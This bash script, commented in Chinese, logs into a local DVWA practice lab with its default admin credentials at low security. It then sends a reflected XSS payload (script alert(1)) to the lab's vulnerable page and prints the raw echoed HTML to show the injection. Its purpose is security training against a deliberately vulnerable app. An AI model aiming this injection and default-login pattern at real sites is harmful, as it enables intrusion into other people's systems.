#!/usr/bin/env bash
# DVWA 反射型 XSS：命令行看原始回显（含登录态）
# 用法：bash scripts/dvwa-xss.sh
set -u
BASE=http://127.0.0.1:8081
COOKIE=$(mktemp)
trap 'rm -f "$COOKIE"' EXIT

# 登录拿会话（漏洞页面要求登录，没 session 会被 302 弹回登录页）
TOK=$(curl -s -c "$COOKIE" "$BASE/login.php" | grep -oE "user_token' value='[a-f0-9]+'" | head -1 | cut -d"'" -f3)
curl -s -b "$COOKIE" -c "$COOKIE" -b "security=low" \
  -d "username=admin&password=password&Login=Login&user_token=$TOK" \
  -o /dev/null "$BASE/login.php"

echo "=== 反射型 XSS 的真实回显（payload 原样出现在 HTML 里）==="
curl -s -b "$COOKIE" -b "security=low" \
  "$BASE/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E" \
  | grep -oE "<pre>Hello.*</pre>"
